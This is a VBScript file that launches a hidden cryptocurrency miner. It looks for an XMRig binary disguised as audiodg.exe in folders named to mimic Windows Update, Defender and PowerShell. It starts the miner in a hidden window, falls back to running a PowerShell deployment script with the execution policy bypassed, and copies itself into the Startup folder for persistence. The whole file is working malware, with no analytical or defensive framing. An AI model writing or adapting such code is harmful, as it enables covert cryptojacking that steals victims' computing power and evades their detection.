' =====================================================================
' SILENT_LAUNCH.vbs - Auto-detect Miner Location Version
' =====================================================================
' Automatically searches common locations for audiodg.exe + config.json
' =====================================================================

Option Explicit

Dim WshShell, fso, minerFolder, minerExe, configFile
Dim deployScript, vbsName, startupFolder, currentFolder
Dim objWMIService, colProcesses
Dim possibleFolders, folder, found

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' ========== LIST OF POSSIBLE MINER LOCATIONS ==========
possibleFolders = Array( _
    "C:\ProgramData\Microsoft\Windows\WindowsUpdate", _
    "C:\ProgramData\WindowsUpdater", _
    "C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AudioSrv", _
    "C:\ProgramData\Microsoft\Network\Downloader", _
    WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\PowerShell", _
    WshShell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows\Defender", _
    WshShell.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Templates", _
    WshShell.ExpandEnvironmentStrings("%TEMP%") & "\WindowsUpdateCache" _
)

' Get current folder of this VBS (for DEPLOY_ULTIMATE.ps1)
currentFolder = fso.GetParentFolderName(WScript.ScriptFullName)
deployScript  = currentFolder & "\DEPLOY_ULTIMATE.ps1"

vbsName       = "SILENT_LAUNCH.vbs"
startupFolder = WshShell.SpecialFolders("Startup") & "\" & vbsName

' ========== AUTO-DETECT MINER LOCATION ==========
found = False

For Each folder In possibleFolders
    If fso.FolderExists(folder) Then
        If fso.FileExists(folder & "\audiodg.exe") And fso.FileExists(folder & "\config.json") Then
            minerFolder = folder
            minerExe    = folder & "\audiodg.exe"
            configFile  = folder & "\config.json"
            found = True
            Exit For
        End If
        ' Also check for normal xmrig.exe (fallback)
        If fso.FileExists(folder & "\xmrig.exe") And fso.FileExists(folder & "\config.json") Then
            minerFolder = folder
            minerExe    = folder & "\xmrig.exe"
            configFile  = folder & "\config.json"
            found = True
            Exit For
        End If
    End If
Next

' ========== IF MINER FOUND → START IT ==========
If found Then
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * From Win32_Process Where Name = '" & fso.GetFileName(minerExe) & "'")

    If colProcesses.Count = 0 Then
        Dim cmdLine
        cmdLine = """" & minerExe & """ --config=""" & configFile & """ --no-color"
        WshShell.Run cmdLine, 0, False
    End If

Else
    ' Miner not found → try to run DEPLOY_ULTIMATE.ps1
    If fso.FileExists(deployScript) Then
        WshShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & deployScript & """", 0, False
    End If
End If

' ========== ADD TO STARTUP ==========
If Not fso.FileExists(startupFolder) Then
    On Error Resume Next
    fso.CopyFile WScript.ScriptFullName, startupFolder, True
    On Error GoTo 0
End If

WScript.Quit